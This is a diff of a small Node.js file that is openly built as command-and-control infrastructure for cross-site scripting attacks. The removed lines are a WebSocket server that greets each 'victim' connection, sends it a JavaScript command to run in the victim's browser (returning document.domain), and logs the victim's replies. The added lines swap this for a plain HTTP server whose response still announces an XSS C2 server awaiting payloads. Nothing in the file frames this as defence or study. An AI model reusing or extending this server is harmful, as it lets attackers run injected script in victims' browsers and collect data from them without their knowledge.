@@ -1,18 +1,11 @@
-const http = require("http");
-const WebSocket = require("ws");
+const http = require('http');
+const PORT = process.env.PORT || 8080;
 
-const server = http.createServer();
-const wss = new WebSocket.Server({ server });
-
-wss.on("connection", ws => {
-  console.log("👀 Victim connected");
-  ws.send(JSON.stringify({ js: "ws.send(document.domain)" }));
-
-  ws.on("message", msg => {
-    console.log("📦 Victim says:", msg);
-  });
+const server = http.createServer((req, res) => {
+  res.writeHead(200, { 'Content-Type': 'text/plain' });
+  res.end('💀 XSS C2 server online. Awaiting payloads...\n');
 });
 
-server.listen(process.env.PORT || 8080, () => {
-  console.log("🔥 C2 WebSocket server running...");
+server.listen(PORT, () => {
+  console.log(`Server running on port ${PORT}`);
 });
